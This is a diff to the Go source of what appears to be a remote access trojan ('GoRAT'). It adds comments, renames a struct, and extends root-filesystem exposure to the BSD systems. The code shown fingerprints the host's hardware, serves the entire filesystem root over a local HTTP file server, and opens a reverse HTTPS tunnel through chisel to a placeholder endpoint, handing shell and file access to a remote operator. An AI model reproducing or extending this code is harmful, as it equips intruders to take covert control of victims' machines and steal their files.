@@ -10,7 +10,7 @@ import (
 	"strconv"
 	"time"
 
-	ssh "github.com/JustinTimperio/GoRat/shell"
+	ssh "github.com/JustinTimperio/GoRAT/shell"
 	"github.com/JustinTimperio/osinfo"
 	"github.com/jaypipes/ghw"
 	chisel "github.com/jpillora/chisel/client"
@@ -21,7 +21,7 @@ var (
 	endpoint_url = "@ENDPOINT_HERE@"
 )
 
-type Hardware struct {
+type hardware struct {
 	Runtime   string
 	OSArch    string
 	OSName    string
@@ -46,7 +46,7 @@ func main() {
 	}
 }
 
-// Control Server
+// ControlServer Acts as a Simple Mechanism for Translating HTTP requests into GoLang Commands
 func ControlServer(BasePort int) {
 	controlPort := strconv.Itoa(BasePort + 1)
 
@@ -68,14 +68,15 @@ func ControlServer(BasePort int) {
 	})
 
 	http.HandleFunc("/hardware", func(w http.ResponseWriter, r *http.Request) {
-		info := Hardware{}
-		// No Error Handling I Know
+		// No Error Handling I Know But It Will Be Fine XD
 		release := osinfo.GetVersion()
 		memory, _ := ghw.Memory()
 		block, _ := ghw.Block()
 		gpu, _ := ghw.GPU()
 		cpu, _ := ghw.CPU()
 
+		// Set Values for JSON Return
+		info := hardware{}
 		for _, proc := range cpu.Processors {
 			info.CPU = proc.Model
 		}
@@ -92,17 +93,19 @@ func ControlServer(BasePort int) {
 		info.RAM = memory.String()
 		info.Drives = block.String()
 
+		// Encode and Return Struct as JSON
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(info)
 
 	})
 
+	// Start a Simple File Server on `/fs/`
 	fs := http.FileServer(http.Dir(getPaths()))
 	http.Handle("/fs/", http.StripPrefix("/fs/", fs))
 	http.ListenAndServe("127.0.0.1:"+controlPort, nil)
 }
 
-// ChiselWorker
+// ChiselWorker Creates a Reverse HTTPS Tunnel
 func ChiselWorker(BasePort int) (err error) {
 	sshPort := strconv.Itoa(BasePort + 0)
 	controlPort := strconv.Itoa(BasePort + 1)
@@ -130,9 +133,16 @@ func ChiselWorker(BasePort int) (err error) {
 	return nil
 }
 
+// getPaths Returns A Base Path for Each OS
 func getPaths() (out string) {
 	switch runtime.GOOS {
 	case "linux":
+		return "/"
+	case "freebsd":
+		return "/"
+	case "openbsd":
+		return "/"
+	case "netbsd":
 		return "/"
 	case "darwin":
 		return "/"
